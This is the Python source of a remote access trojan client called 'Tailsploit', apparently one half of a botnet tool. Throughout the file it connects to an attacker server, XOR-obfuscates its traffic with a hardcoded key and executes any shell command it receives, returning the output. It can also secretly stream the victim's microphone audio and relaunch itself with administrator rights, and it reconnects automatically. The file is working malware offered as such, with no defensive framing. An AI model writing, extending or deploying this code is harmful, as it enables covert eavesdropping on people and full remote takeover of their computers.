import socket
import shutil
import sys
import subprocess
import os
import time
import ctypes
import pyaudio
import threading

CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

SERVER_IP = "127.0.0.1"
SERVER_PORT = 5050
TRAFFIC_ENCRYPTION_TOKEN = b'AUTHORIZED?BOTNET=ENCRYPTIONTYPE?XOR'


def handleXOREncryption(content_data, key_traffic):
    key_traffic = key_traffic * (len(content_data) // len(key_traffic)) + key_traffic[:len(content_data) % len(key_traffic)]
    return bytes([byte ^ key_byte for byte, key_byte in zip(content_data, key_traffic)])

class TailsploitClient:
    def __init__(self):
        self.audio_thread = None
        self.audio_stop_event = threading.Event()
        self.audio_stopped = False

    def handle_microphone(self, client_socket):
        try:
            audio = pyaudio.PyAudio()
            stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
            while not self.audio_stop_event.is_set():
                data = stream.read(CHUNK)
                client_socket.send("AUD:".encode() + data)
        except Exception as e:
            print(e)
        finally:
            if not self.audio_stop_event.is_set():
                self.audio_stopped = True

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception as e:
            return False

    def InitializingTailsploitConnection(self):
        try:
            IsBypassUAC = "False"
            DesktopName = "ww"
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_IP, SERVER_PORT))
            connection_flag = f"--FLAG:CLIENT_PAYLOAD::{IsBypassUAC}::{DesktopName}"
            connection_flag_xor = handleXOREncryption(connection_flag.encode("utf-8"), TRAFFIC_ENCRYPTION_TOKEN)
            client_socket.send(connection_flag_xor)
            print("Flag sended")
            while True:
                    print("Connected to Tailsploit's Attacker Server.")
                    command = client_socket.recv(4096)
                    commandDecode = handleXOREncryption(command, TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")

                    if commandDecode == "REVERSE_SHELL_THREAD=ISALIVE?":
                        client_socket.send("REVERSE_SHELL_THREAD=ISALIVE?TRUE".encode("utf-8"))
                    
                    elif commandDecode == "LISTENING_MICROPHONE":
                        if not self.audio_thread or self.audio_stopped:
                            print("[*] Listening to the microphone...")
                            self.audio_stopped = False
                            self.audio_stop_event.clear()
                            self.audio_thread = threading.Thread(target=self.handle_microphone, args=(client_socket,))
                            self.audio_thread.start()
                        else:
                            print("[*] Microphone is already being listened to.")

                    elif commandDecode == "STOP_MICROPHONE":
                        if self.audio_thread and not self.audio_stopped:
                            print("[*] Stopping microphone listening...")
                            self.audio_stop_event.set()
                            self.audio_thread.join()
                            self.audio_stopped = True
                        else:
                            print("[*] Microphone is not being listened to.")
                    
                    elif commandDecode == "IS_ADMIN":
                        if self.is_admin():
                            client_socket.send("--FLAG:UAP=TRUE".encode("utf-8"))
                        else:
                            client_socket.send("--FLAG:UAP=FALSE".encode("utf-8"))
                    elif commandDecode == "BYPASS_UAC":
                        if self.is_admin():
                            client_socket.send("--FLAG:UAC_BYPASS_ALRDY".encode("utf-8"))
                        else:
                            try:
                                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                                client_socket.send("--FLAG:UAC_BYPASS_ATTEMPT".encode("utf-8"))
                                os._exit(0)
                            except Exception as e:
                                print(f"Failed to run as admin: {e}")
                                return False
                    else:
                        try:
                            output = subprocess.check_output(commandDecode, shell=True, stderr=subprocess.STDOUT, text=True)
                            client_socket.send(handleXOREncryption(output.encode("utf-8"), TRAFFIC_ENCRYPTION_TOKEN))
                        except subprocess.CalledProcessError as e:
                            error_message = f"Error executing command: {e.output}"
                            client_socket.send(handleXOREncryption(error_message.encode("utf-8"), TRAFFIC_ENCRYPTION_TOKEN))


        except:
            print("Rtrying...")
            time.sleep(5)
            xw = TailsploitClient()
            xw.InitializingTailsploitConnection()



if __name__ == "__main__":
    x = TailsploitClient()
    x.InitializingTailsploitConnection()
